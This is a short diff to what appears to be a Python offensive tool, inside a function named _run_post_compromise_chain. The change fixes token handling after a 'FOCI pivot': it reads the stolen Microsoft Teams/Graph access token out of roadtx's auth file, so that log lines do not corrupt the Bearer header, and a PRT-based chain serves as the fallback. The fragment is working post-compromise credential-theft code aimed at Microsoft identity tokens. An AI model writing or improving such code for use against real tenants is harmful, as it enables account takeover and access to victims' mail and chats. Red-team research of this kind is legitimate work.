@@ -252,7 +252,17 @@ def _run_post_compromise_chain(user_code):
 
     if step1_out:
         logger.info("✓ Step 1 SUCCESS: Teams token acquired via FOCI pivot.")
-        teams_token_acquired = step1_out
+        # roadtx overwrites the auth file with the msgraph-audience token.
+        # Read the ACCESS TOKEN from it — the raw stdout contains log lines
+        # ('Requesting token for resource...', 'Tokens were written to...')
+        # which corrupt the Bearer header if stored as-is.
+        try:
+            with open(auth_file, 'r') as _af:
+                _auth_data = json.load(_af)
+            teams_token_acquired = _auth_data.get('accessToken') or _auth_data.get('access_token') or step1_out
+        except Exception as _e:
+            logger.warning(f"Could not re-read auth file for msgraph token: {_e}")
+            teams_token_acquired = None
     else:
         logger.warning("✗ Step 1 FAILED: Not FOCI-compatible. Continuing via PRT chain.")
 
